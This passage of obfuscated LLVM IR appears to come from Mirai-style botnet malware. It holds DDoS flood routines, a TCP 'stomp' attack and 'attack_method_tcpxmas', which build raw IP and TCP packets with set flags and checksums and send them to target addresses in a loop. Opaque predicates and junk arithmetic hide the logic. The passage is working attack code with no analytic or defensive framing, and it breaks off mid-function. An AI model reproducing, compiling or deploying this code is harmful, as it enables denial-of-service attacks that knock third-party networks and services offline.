  %_61 = sub i32 %1029, 65535
  %gen62 = mul i32 %_61, 65535
  %_63 = sub i32 0, %1029
  %gen64 = add i32 %_63, 65535
  %1030 = and i32 %1029, 65535
  %1031 = trunc i32 %1030 to i16
  %1032 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1033 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1032, i32 0, i32 5
  store i16 %1031, i16* %1033, align 2
  %1034 = load i8, i8* %18, align 1
  %1035 = sext i8 %1034 to i16
  %1036 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1037 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1036, i32 0, i32 4
  %1038 = load i16, i16* %1037, align 4
  %_65 = sub i16 %1035, 1
  %gen66 = mul i16 %_65, 1
  %_67 = sub i16 0, %1035
  %gen68 = add i16 %_67, 1
  %_69 = sub i16 0, %1035
  %gen70 = add i16 %_69, 1
  %_71 = sub i16 %1035, 1
  %gen72 = mul i16 %_71, 1
  %_73 = sub i16 %1035, 1
  %gen74 = mul i16 %_73, 1
  %1039 = and i16 %1035, 1
  %_75 = sub i16 0, %1039
  %gen76 = add i16 %_75, 13
  %_77 = sub i16 %1039, 13
  %gen78 = mul i16 %_77, 13
  %_79 = shl i16 %1039, 13
  %1040 = shl i16 %1039, 13
  %_80 = sub i16 0, %1038
  %gen81 = add i16 %_80, -8193
  %_82 = sub i16 %1038, -8193
  %gen83 = mul i16 %_82, -8193
  %_84 = shl i16 %1038, -8193
  %1041 = and i16 %1038, -8193
  %_85 = shl i16 %1041, %1040
  %_86 = sub i16 0, %1041
  %gen87 = add i16 %_86, %1040
  %_88 = sub i16 0, %1041
  %gen89 = add i16 %_88, %1040
  %_90 = sub i16 %1041, %1040
  %gen91 = mul i16 %_90, %1040
  %_92 = shl i16 %1041, %1040
  %_93 = shl i16 %1041, %1040
  %_94 = sub i16 0, %1041
  %gen95 = add i16 %_94, %1040
  %1042 = or i16 %1041, %1040
  store i16 %1042, i16* %1037, align 4
  %1043 = load i8, i8* %19, align 1
  %1044 = sext i8 %1043 to i16
  %1045 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1046 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1045, i32 0, i32 4
  %1047 = load i16, i16* %1046, align 4
  %_96 = sub i16 %1044, 1
  %gen97 = mul i16 %_96, 1
  %_98 = shl i16 %1044, 1
  %_99 = sub i16 %1044, 1
  %gen100 = mul i16 %_99, 1
  %_101 = sub i16 0, %1044
  %gen102 = add i16 %_101, 1
  %1048 = and i16 %1044, 1
  %_103 = sub i16 %1048, 12
  %gen104 = mul i16 %_103, 12
  %1049 = shl i16 %1048, 12
  %_105 = shl i16 %1047, -4097
  %_106 = shl i16 %1047, -4097
  %_107 = sub i16 %1047, -4097
  %gen108 = mul i16 %_107, -4097
  %1050 = and i16 %1047, -4097
  %_109 = sub i16 %1050, %1049
  %gen110 = mul i16 %_109, %1049
  %_111 = sub i16 0, %1050
  %gen112 = add i16 %_111, %1049
  %_113 = sub i16 0, %1050
  %gen114 = add i16 %_113, %1049
  %_115 = sub i16 %1050, %1049
  %gen116 = mul i16 %_115, %1049
  %_117 = sub i16 %1050, %1049
  %gen118 = mul i16 %_117, %1049
  %_119 = shl i16 %1050, %1049
  %_120 = sub i16 0, %1050
  %gen121 = add i16 %_120, %1049
  %1051 = or i16 %1050, %1049
  store i16 %1051, i16* %1046, align 4
  %1052 = load i8, i8* %20, align 1
  %1053 = sext i8 %1052 to i16
  %1054 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1055 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1054, i32 0, i32 4
  %1056 = load i16, i16* %1055, align 4
  %_122 = shl i16 %1053, 1
  %_123 = sub i16 %1053, 1
  %gen124 = mul i16 %_123, 1
  %_125 = sub i16 %1053, 1
  %gen126 = mul i16 %_125, 1
  %_127 = shl i16 %1053, 1
  %_128 = sub i16 %1053, 1
  %gen129 = mul i16 %_128, 1
  %_130 = sub i16 0, %1053
  %gen131 = add i16 %_130, 1
  %1057 = and i16 %1053, 1
  %_132 = sub i16 %1057, 11
  %gen133 = mul i16 %_132, 11
  %1058 = shl i16 %1057, 11
  %_134 = sub i16 0, %1056
  %gen135 = add i16 %_134, -2049
  %_136 = sub i16 %1056, -2049
  %gen137 = mul i16 %_136, -2049
  %_138 = sub i16 0, %1056
  %gen139 = add i16 %_138, -2049
  %_140 = shl i16 %1056, -2049
  %1059 = and i16 %1056, -2049
  %_141 = sub i16 %1059, %1058
  %gen142 = mul i16 %_141, %1058
  %_143 = sub i16 0, %1059
  %gen144 = add i16 %_143, %1058
  %_145 = sub i16 %1059, %1058
  %gen146 = mul i16 %_145, %1058
  %_147 = sub i16 %1059, %1058
  %gen148 = mul i16 %_147, %1058
  %_149 = sub i16 0, %1059
  %gen150 = add i16 %_149, %1058
  %_151 = sub i16 0, %1059
  %gen152 = add i16 %_151, %1058
  %_153 = sub i16 0, %1059
  %gen154 = add i16 %_153, %1058
  %1060 = or i16 %1059, %1058
  store i16 %1060, i16* %1055, align 4
  %1061 = load i8, i8* %21, align 1
  %1062 = sext i8 %1061 to i16
  %1063 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1064 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1063, i32 0, i32 4
  %1065 = load i16, i16* %1064, align 4
  %_155 = sub i16 0, %1062
  %gen156 = add i16 %_155, 1
  %1066 = and i16 %1062, 1
  %_157 = sub i16 0, %1066
  %gen158 = add i16 %_157, 10
  %_159 = shl i16 %1066, 10
  %_160 = sub i16 0, %1066
  %gen161 = add i16 %_160, 10
  %_162 = sub i16 %1066, 10
  %gen163 = mul i16 %_162, 10
  %_164 = sub i16 %1066, 10
  %gen165 = mul i16 %_164, 10
  %_166 = sub i16 0, %1066
  %gen167 = add i16 %_166, 10
  %1067 = shl i16 %1066, 10
  %_168 = shl i16 %1065, -1025
  %1068 = and i16 %1065, -1025
  %_169 = sub i16 0, %1068
  %gen170 = add i16 %_169, %1067
  %_171 = sub i16 0, %1068
  %gen172 = add i16 %_171, %1067
  %1069 = or i16 %1068, %1067
  store i16 %1069, i16* %1064, align 4
  %1070 = load i8, i8* %22, align 1
  %1071 = sext i8 %1070 to i16
  %1072 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1073 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1072, i32 0, i32 4
  %1074 = load i16, i16* %1073, align 4
  %_173 = sub i16 %1071, 1
  %gen174 = mul i16 %_173, 1
  %_175 = sub i16 %1071, 1
  %gen176 = mul i16 %_175, 1
  %_177 = sub i16 0, %1071
  %gen178 = add i16 %_177, 1
  %_179 = shl i16 %1071, 1
  %_180 = sub i16 %1071, 1
  %gen181 = mul i16 %_180, 1
  %_182 = shl i16 %1071, 1
  %1075 = and i16 %1071, 1
  %_183 = sub i16 0, %1075
  %gen184 = add i16 %_183, 9
  %_185 = sub i16 %1075, 9
  %gen186 = mul i16 %_185, 9
  %_187 = sub i16 %1075, 9
  %gen188 = mul i16 %_187, 9
  %1076 = shl i16 %1075, 9
  %_189 = shl i16 %1074, -513
  %_190 = shl i16 %1074, -513
  %_191 = sub i16 %1074, -513
  %gen192 = mul i16 %_191, -513
  %_193 = shl i16 %1074, -513
  %_194 = shl i16 %1074, -513
  %_195 = shl i16 %1074, -513
  %1077 = and i16 %1074, -513
  %_196 = shl i16 %1077, %1076
  %_197 = shl i16 %1077, %1076
  %_198 = sub i16 0, %1077
  %gen199 = add i16 %_198, %1076
  %_200 = shl i16 %1077, %1076
  %1078 = or i16 %1077, %1076
  store i16 %1078, i16* %1073, align 4
  %1079 = load i8, i8* %23, align 1
  %1080 = sext i8 %1079 to i16
  %1081 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1082 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1081, i32 0, i32 4
  %1083 = load i16, i16* %1082, align 4
  %_201 = sub i16 0, %1080
  %gen202 = add i16 %_201, 1
  %_203 = sub i16 0, %1080
  %gen204 = add i16 %_203, 1
  %_205 = shl i16 %1080, 1
  %_206 = sub i16 %1080, 1
  %gen207 = mul i16 %_206, 1
  %1084 = and i16 %1080, 1
  %_208 = shl i16 %1084, 8
  %_209 = shl i16 %1084, 8
  %_210 = shl i16 %1084, 8
  %_211 = sub i16 0, %1084
  %gen212 = add i16 %_211, 8
  %_213 = sub i16 0, %1084
  %gen214 = add i16 %_213, 8
  %_215 = sub i16 %1084, 8
  %gen216 = mul i16 %_215, 8
  %_217 = sub i16 0, %1084
  %gen218 = add i16 %_217, 8
  %1085 = shl i16 %1084, 8
  %_219 = sub i16 %1083, -257
  %gen220 = mul i16 %_219, -257
  %_221 = sub i16 0, %1083
  %gen222 = add i16 %_221, -257
  %_223 = sub i16 %1083, -257
  %gen224 = mul i16 %_223, -257
  %1086 = and i16 %1083, -257
  %_225 = sub i16 %1086, %1085
  %gen226 = mul i16 %_225, %1085
  %_227 = sub i16 %1086, %1085
  %gen228 = mul i16 %_227, %1085
  %_229 = sub i16 %1086, %1085
  %gen230 = mul i16 %_229, %1085
  %_231 = shl i16 %1086, %1085
  %_232 = sub i16 0, %1086
  %gen233 = add i16 %_232, %1085
  %_234 = sub i16 0, %1086
  %gen235 = add i16 %_234, %1085
  %_236 = sub i16 %1086, %1085
  %gen237 = mul i16 %_236, %1085
  %1087 = or i16 %1086, %1085
  store i16 %1087, i16* %1082, align 4
  %1088 = load i8*, i8** %38, align 8
  %1089 = load i32, i32* %24, align 4
  call void @rand_str(i8* %1088, i32 %1089)
  br label %originalBB26

originalBB241alteredBB:                           ; preds = %originalBB241, %596
  %1090 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %1091 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1090, i32 0, i32 4
  %1092 = load i16, i16* %1091, align 4
  %_242 = sub i16 %1092, 10
  %gen243 = mul i16 %_242, 10
  %1093 = lshr i16 %1092, 10
  %_244 = shl i16 %1093, 1
  %_245 = shl i16 %1093, 1
  %_246 = sub i16 0, %1093
  %gen247 = add i16 %_246, 1
  %_248 = sub i16 0, %1093
  %gen249 = add i16 %_248, 1
  %1094 = and i16 %1093, 1
  %1095 = zext i16 %1094 to i32
  %1096 = icmp ne i32 %1095, 0
  br label %originalBB241

originalBB253alteredBB:                           ; preds = %originalBB253, %623
  br label %originalBB253

originalBB257alteredBB:                           ; preds = %originalBB257, %640
  br label %originalBB257

originalBB261alteredBB:                           ; preds = %originalBB261, %657
  br label %originalBB261

originalBB265alteredBB:                           ; preds = %originalBB265, %674
  %1097 = call i64 @time(i64* null) #6
  %1098 = load i64, i64* %31, align 8
  %_266 = sub i64 %1097, %1098
  %gen267 = mul i64 %_266, %1098
  %_268 = sub i64 %1097, %1098
  %gen269 = mul i64 %_268, %1098
  %_270 = sub i64 0, %1097
  %gen271 = add i64 %_270, %1098
  %_272 = sub i64 %1097, %1098
  %gen273 = mul i64 %_272, %1098
  %1099 = sub nsw i64 %1097, %1098
  %1100 = icmp sgt i64 %1099, 10
  br label %originalBB265

originalBB277alteredBB:                           ; preds = %originalBB277, %695
  %1101 = load i32, i32* %26, align 4
  %1102 = call i32 @close(i32 %1101)
  br label %originalBB277

originalBB281alteredBB:                           ; preds = %originalBB281, %716
  %1103 = load i32, i32* %9, align 4
  %_282 = shl i32 %1103, 1
  %_283 = sub i32 0, %1103
  %gen284 = add i32 %_283, 1
  %_285 = sub i32 %1103, 1
  %gen286 = mul i32 %_285, 1
  %_287 = sub i32 %1103, 1
  %gen288 = mul i32 %_287, 1
  %_289 = sub i32 0, %1103
  %gen290 = add i32 %_289, 1
  %1104 = add nsw i32 %1103, 1
  store i32 %1104, i32* %9, align 4
  br label %originalBB281

originalBB294alteredBB:                           ; preds = %originalBB294, %742
  %1105 = load i8**, i8*** %12, align 8
  %1106 = load i32, i32* %9, align 4
  %1107 = sext i32 %1106 to i64
  %1108 = getelementptr inbounds i8*, i8** %1105, i64 %1107
  %1109 = load i8*, i8** %1108, align 8
  store i8* %1109, i8** %39, align 8
  %1110 = load i8*, i8** %39, align 8
  %1111 = bitcast i8* %1110 to %struct.iphdr*
  store %struct.iphdr* %1111, %struct.iphdr** %40, align 8
  %1112 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %1113 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1112, i64 1
  %1114 = bitcast %struct.iphdr* %1113 to %struct.tcphdr*
  store %struct.tcphdr* %1114, %struct.tcphdr** %41, align 8
  %1115 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1116 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1115, i64 1
  %1117 = bitcast %struct.tcphdr* %1116 to i8*
  store i8* %1117, i8** %42, align 8
  %1118 = load i16, i16* %14, align 2
  %1119 = zext i16 %1118 to i32
  %1120 = icmp eq i32 %1119, 65535
  br label %originalBB294

originalBB298alteredBB:                           ; preds = %originalBB298, %781
  %1121 = load i8, i8* %25, align 1
  %1122 = icmp ne i8 %1121, 0
  br label %originalBB298

originalBB302alteredBB:                           ; preds = %originalBB302, %800
  %1123 = load i8*, i8** %42, align 8
  %1124 = load i32, i32* %24, align 4
  call void @rand_str(i8* %1123, i32 %1124)
  br label %originalBB302

originalBB306alteredBB:                           ; preds = %originalBB306, %819
  %1125 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %1126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1125, i32 0, i32 7
  store i16 0, i16* %1126, align 2
  %1127 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %1128 = bitcast %struct.iphdr* %1127 to i16*
  %1129 = call zeroext i16 @checksum_generic(i16* %1128, i32 20)
  %1130 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %1131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1130, i32 0, i32 7
  store i16 %1129, i16* %1131, align 2
  %1132 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %1133 = load i32, i32* %9, align 4
  %1134 = sext i32 %1133 to i64
  %1135 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1132, i64 %1134
  %1136 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1135, i32 0, i32 1
  %1137 = load i32, i32* %1136, align 4
  %_307 = sub i32 %1137, 1
  %gen308 = mul i32 %_307, 1
  %_309 = sub i32 %1137, 1
  %gen310 = mul i32 %_309, 1
  %_311 = sub i32 %1137, 1
  %gen312 = mul i32 %_311, 1
  %_313 = sub i32 0, %1137
  %gen314 = add i32 %_313, 1
  %_315 = sub i32 0, %1137
  %gen316 = add i32 %_315, 1
  %_317 = sub i32 %1137, 1
  %gen318 = mul i32 %_317, 1
  %1138 = add i32 %1137, 1
  store i32 %1138, i32* %1136, align 4
  %1139 = trunc i32 %1137 to i16
  %1140 = call zeroext i16 @htons(i16 zeroext %1139) #7
  %1141 = zext i16 %1140 to i32
  %1142 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1143 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1142, i32 0, i32 2
  store i32 %1141, i32* %1143, align 4
  %1144 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %1145 = load i32, i32* %9, align 4
  %1146 = sext i32 %1145 to i64
  %1147 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1144, i64 %1146
  %1148 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1147, i32 0, i32 2
  %1149 = load i32, i32* %1148, align 4
  %1150 = trunc i32 %1149 to i16
  %1151 = call zeroext i16 @htons(i16 zeroext %1150) #7
  %1152 = zext i16 %1151 to i32
  %1153 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1154 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1153, i32 0, i32 3
  store i32 %1152, i32* %1154, align 4
  %1155 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1156 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1155, i32 0, i32 6
  store i16 0, i16* %1156, align 4
  %1157 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %1158 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1159 = bitcast %struct.tcphdr* %1158 to i8*
  %1160 = load i32, i32* %24, align 4
  %1161 = sext i32 %1160 to i64
  %1162 = add i64 20, %1161
  %1163 = trunc i64 %1162 to i16
  %1164 = call zeroext i16 @htons(i16 zeroext %1163) #7
  %1165 = load i32, i32* %24, align 4
  %1166 = sext i32 %1165 to i64
  %_319 = shl i64 20, %1166
  %_320 = sub i64 0, 20
  %gen321 = add i64 %_320, %1166
  %_322 = sub i64 20, %1166
  %gen323 = mul i64 %_322, %1166
  %_324 = shl i64 20, %1166
  %_325 = sub i64 0, 20
  %gen326 = add i64 %_325, %1166
  %_327 = sub i64 0, 20
  %gen328 = add i64 %_327, %1166
  %_329 = shl i64 20, %1166
  %_330 = shl i64 20, %1166
  %1167 = add i64 20, %1166
  %1168 = trunc i64 %1167 to i32
  %1169 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %1157, i8* %1159, i16 zeroext %1164, i32 %1168)
  %1170 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1170, i32 0, i32 6
  store i16 %1169, i16* %1171, align 4
  %1172 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1173 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1172, i32 0, i32 1
  %1174 = load i16, i16* %1173, align 2
  %1175 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %1176 = load i32, i32* %9, align 4
  %1177 = sext i32 %1176 to i64
  %1178 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1175, i64 %1177
  %1179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1178, i32 0, i32 0
  %1180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1179, i32 0, i32 1
  store i16 %1174, i16* %1180, align 2
  %1181 = load i32, i32* %10, align 4
  %1182 = load i8*, i8** %39, align 8
  %1183 = load i32, i32* %24, align 4
  %1184 = sext i32 %1183 to i64
  %_331 = sub i64 40, %1184
  %gen332 = mul i64 %_331, %1184
  %_333 = sub i64 40, %1184
  %gen334 = mul i64 %_333, %1184
  %_335 = sub i64 40, %1184
  %gen336 = mul i64 %_335, %1184
  %_337 = sub i64 40, %1184
  %gen338 = mul i64 %_337, %1184
  %_339 = sub i64 0, 40
  %gen340 = add i64 %_339, %1184
  %_341 = shl i64 40, %1184
  %_342 = sub i64 0, 40
  %gen343 = add i64 %_342, %1184
  %_344 = shl i64 40, %1184
  %1185 = add i64 40, %1184
  %1186 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %1187 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %1188 = load i32, i32* %9, align 4
  %1189 = sext i32 %1188 to i64
  %1190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1187, i64 %1189
  %1191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1190, i32 0, i32 0
  %1192 = bitcast %struct.sockaddr_in* %1191 to %struct.sockaddr*
  store %struct.sockaddr* %1192, %struct.sockaddr** %1186, align 8
  %1193 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %1194 = load %struct.sockaddr*, %struct.sockaddr** %1193, align 8
  %1195 = call i64 @sendto(i32 %1181, i8* %1182, i64 %1185, i32 16384, %struct.sockaddr* %1194, i32 16)
  br label %originalBB306

originalBB348alteredBB:                           ; preds = %originalBB348, %911
  br label %originalBB348
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #3

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpxmas(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.31
  %6 = load i32, i32* @y.32
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca %struct.attack_stomp_data*, align 8
  %20 = alloca i8**, align 8
  %21 = alloca i8, align 1
  %22 = alloca i16, align 2
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i16, align 2
  %26 = alloca i8, align 1
  %27 = alloca i8, align 1
  %28 = alloca i8, align 1
  %29 = alloca i8, align 1
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i32, align 4
  %33 = alloca i8, align 1
  %34 = alloca i32, align 4
  %35 = alloca %struct.sockaddr_in, align 4
  %36 = alloca %struct.sockaddr_in, align 4
  %37 = alloca i32, align 4
  %38 = alloca [256 x i8], align 16
  %39 = alloca i64, align 8
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %41 = alloca i32, align 4
  %42 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %43 = alloca %struct.tcphdr*, align 8
  %44 = alloca %struct.iphdr*, align 8
  %45 = alloca %struct.tcphdr*, align 8
  %46 = alloca i8*, align 8
  %47 = alloca i8*, align 8
  %48 = alloca %struct.iphdr*, align 8
  %49 = alloca %struct.tcphdr*, align 8
  %50 = alloca i8*, align 8
  %51 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %52 = load i8, i8* %13, align 1
  %53 = zext i8 %52 to i64
  %54 = call noalias i8* @calloc(i64 %53, i64 16) #6
  %55 = bitcast i8* %54 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %55, %struct.attack_stomp_data** %19, align 8
  %56 = load i8, i8* %13, align 1
  %57 = zext i8 %56 to i64
  %58 = call noalias i8* @calloc(i64 %57, i64 8) #6
  %59 = bitcast i8* %58 to i8**
  store i8** %59, i8*** %20, align 8
  %60 = load i8, i8* %15, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 2, i32 0)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %21, align 1
  %64 = load i8, i8* %15, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 3, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %22, align 2
  %68 = load i8, i8* %15, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 4, i32 64)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %23, align 1
  %72 = load i8, i8* %15, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 5, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %24, align 1
  %76 = load i8, i8* %15, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 7, i32 65535)
  %79 = trunc i32 %78 to i16
  store i16 %79, i16* %25, align 2
  %80 = load i8, i8* %15, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 11, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %26, align 1
  %84 = load i8, i8* %15, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 12, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %27, align 1
  %88 = load i8, i8* %15, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 13, i32 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %28, align 1
  %92 = load i8, i8* %15, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 14, i32 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %29, align 1
  %96 = load i8, i8* %15, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 15, i32 1)
  %99 = trunc i32 %98 to i8
  store i8 %99, i8* %30, align 1
  %100 = load i8, i8* %15, align 1
  %101 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %102 = call i32 @attack_get_opt_int(i8 zeroext %100, %struct.attack_option* %101, i8 zeroext 16, i32 1)
  %103 = trunc i32 %102 to i8
  store i8 %103, i8* %31, align 1
  %104 = load i8, i8* %15, align 1
  %105 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %106 = call i32 @attack_get_opt_int(i8 zeroext %104, %struct.attack_option* %105, i8 zeroext 0, i32 768)
  store i32 %106, i32* %32, align 4
  %107 = load i8, i8* %15, align 1
  %108 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %109 = call i32 @attack_get_opt_int(i8 zeroext %107, %struct.attack_option* %108, i8 zeroext 1, i32 1)
  %110 = trunc i32 %109 to i8
  store i8 %110, i8* %33, align 1
  %111 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %111, i32* %18, align 4
  %112 = icmp eq i32 %111, -1
  %113 = load i32, i32* @x.31
  %114 = load i32, i32* @y.32
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %112, label %121, label %122

; <label>:121:                                    ; preds = %originalBBpart2
  br label %831

; <label>:122:                                    ; preds = %originalBBpart2
  store i32 1, i32* %17, align 4
  %123 = load i32, i32* %18, align 4
  %124 = bitcast i32* %17 to i8*
  %125 = call i32 @setsockopt(i32 %123, i32 0, i32 3, i8* %124, i32 4) #6
  %126 = icmp eq i32 %125, -1
  br i1 %126, label %127, label %130

; <label>:127:                                    ; preds = %122
  %128 = load i32, i32* %18, align 4
  %129 = call i32 @close(i32 %128)
  br label %831

; <label>:130:                                    ; preds = %122
  %131 = load i32, i32* @x.31
  %132 = load i32, i32* @y.32
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %130
  store i32 0, i32* %17, align 4
  %139 = load i32, i32* @x.31
  %140 = load i32, i32* @y.32
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %147

; <label>:147:                                    ; preds = %originalBBpart250, %originalBBpart24
  %148 = load i32, i32* %17, align 4
  %149 = load i8, i8* %13, align 1
  %150 = zext i8 %149 to i32
  %151 = icmp slt i32 %148, %150
  br i1 %151, label %152, label %655

; <label>:152:                                    ; preds = %147
  br label %153

; <label>:153:                                    ; preds = %631, %604, %152
  %154 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %154, i32* %34, align 4
  %155 = icmp eq i32 %154, -1
  br i1 %155, label %156, label %157

; <label>:156:                                    ; preds = %153
  br label %636

; <label>:157:                                    ; preds = %153
  %158 = load i32, i32* %34, align 4
  %159 = load i32, i32* %34, align 4
  %160 = call i32 (i32, i32, ...) @fcntl(i32 %159, i32 3, i32 0)
  %161 = or i32 %160, 2048
  %162 = call i32 (i32, i32, ...) @fcntl(i32 %158, i32 4, i32 %161)
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 0
  store i16 2, i16* %163, align 4
  %164 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %165 = load i32, i32* %17, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 2
  %169 = load i8, i8* %168, align 4
  %170 = zext i8 %169 to i32
  %171 = icmp slt i32 %170, 32
